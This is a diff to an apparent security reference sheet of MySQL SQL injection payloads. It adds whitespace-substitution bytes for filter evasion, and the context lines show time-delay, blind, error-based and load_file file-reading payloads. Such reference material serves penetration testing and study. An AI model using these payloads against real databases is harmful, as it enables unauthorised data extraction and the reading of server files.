@@ -7,6 +7,8 @@ MySQL Payload
     - ``SELECT 1 -- comment``
     - ``SELECT 1 # comment``
     - ``SELECT /*comment*/1``
+- Space
+    - ``0x9`` ``0xa-0xd`` ``0x20`` ``0xa0``
 - Current User
     - ``SELECT user()``
     - ``SELECT system_user()``
@@ -23,9 +25,9 @@ MySQL Payload
 - If
     - ``SELECT if(1=1,'foo','bar');`` return 'foo'
 - Ascii
-    - ``SELECT char(0×41)``
+    - ``SELECT char(0x41)``
     - ``SELECT ascii('A')``
-    - ``SELECT 0×414243`` => return ``ABC``
+    - ``SELECT 0x414243`` => return ``ABC``
 - Delay
     - ``sleep(1)``
     - ``SELECT BENCHMARK(1000000,MD5('A'))``
@@ -33,7 +35,7 @@ MySQL Payload
     - ``select @@datadir``
     - ``select load_file('databasename/tablename.MYD')``
 - Blind
-    - ``ascii(subtring(str,pos,length)) & 32 == 1``
+    - ``ascii(substring(str,pos,length)) & 32 = 1``
 - Error Based
     - ``select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;``
 - Write File
